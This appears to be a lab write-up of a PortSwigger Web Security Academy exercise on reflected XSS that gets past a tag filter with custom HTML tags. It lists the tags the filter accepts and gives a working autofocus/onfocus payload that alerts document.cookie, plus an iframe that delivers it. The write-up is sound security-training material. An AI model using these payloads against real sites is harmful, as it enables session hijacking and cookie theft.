
# Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/contexts

---------------------------------------------

The content of the search is reflected inside a h1 HTML element:



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/1.png)


I will send the following payload to Intruder:

```
<tag attrib=alert(1)>text</tag>
```

First test the attributes:



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/2.png)

It seems all attributes are valid:



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/3.png)


Then the tags:



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/4.png)


These are valid:
• animatetransform
• animatemotion
• custom tags
• animate
• iframe2
• audio2
• image2
• image3
• input2
• input3
• input4
• video2
• img2
• set
• a2



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/5.png)


For example we can pop an alert with:

```
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
```

```
https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E
```

```
<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>
```

